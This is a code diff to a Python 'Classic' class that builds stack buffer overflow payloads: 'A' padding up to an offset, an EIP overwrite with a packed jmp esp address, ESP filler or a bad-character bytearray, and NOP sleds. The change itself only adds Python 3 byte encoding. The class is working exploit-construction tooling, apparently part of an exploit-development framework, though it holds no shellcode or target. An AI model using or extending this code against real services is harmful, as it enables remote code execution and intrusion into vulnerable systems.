@@ -11,15 +11,6 @@ from utils.system import *
 
 class Classic:
 
-    # remoteip = ""
-    # remoteport = 0
-    # field = ""
-    # mode = ""
-    #
-    # offset = 0
-    # overflow = 0
-    # jmpesp_add = ""
-
     eip = ""
     esp = ""
     buffer = ""
@@ -39,18 +30,25 @@ class Classic:
         if (self.config.verbose_lv >= 1):
             print("[+] Filling stack at " + str(offset))
 
-        offset = "A" * offset
-        self.eip = "B" * 4
-        self.esp = "C" * 400
+        if (sys.version_info >= (3, 0)):
+            offset = ("A" * offset).encode('latin-1')
+        else:
+            offset = ("A" * offset)
+
+        self.eip = ("B" * 4).encode('latin-1')
+        self.esp = ("C" * 400).encode('latin-1')
 
         self.buffer = offset + self.eip + self.esp
-        self.buffer += "\r\n"
+        self.buffer += ("\r\n").encode('latin-1')
 
         return self.buffer
 
     def fill_classic_jmp_esp(self, offset, jmp_esp):
 
-        offset = "A" * offset
+        if (sys.version_info >= (3, 0)):
+            offset = ("A" * offset).encode('latin-1')
+        else:
+            offset = ("A" * offset)
 
         self.eip = pack('<L', int("0x" + jmp_esp, 16))
 
@@ -63,13 +61,22 @@ class Classic:
 
     def fill_classic_bytearray(self, offset, jmp_esp):
 
-        offset = b"A" * offset
+        if (sys.version_info >= (3, 0)):
+            offset = ("A" * offset).encode('latin-1')
+            self.esp = System.bytearray.encode('latin-1')
+        else:
+            offset = ("A" * offset)
+            self.esp = System.bytearray
+
+        # offset = b"A" * offset
 
         self.eip = pack('<L', int("0x" + jmp_esp, 16))
 
-        self.esp = System.bytearray
 
-        self.buffer = offset + self.eip + self.esp
+
+        self.buffer = offset
+        self.buffer += self.eip
+        self.buffer += self.esp
         self.buffer += b"\r\n"
 
         # if(self.config.verbose_lv == 2):
@@ -110,7 +117,6 @@ class Classic:
 
             if (sys.version_info >= (3, 0)):
                 _nops = ("\x90" * nops).encode('latin-1')
-
             else:
                 _nops = "\x90" * nops
 
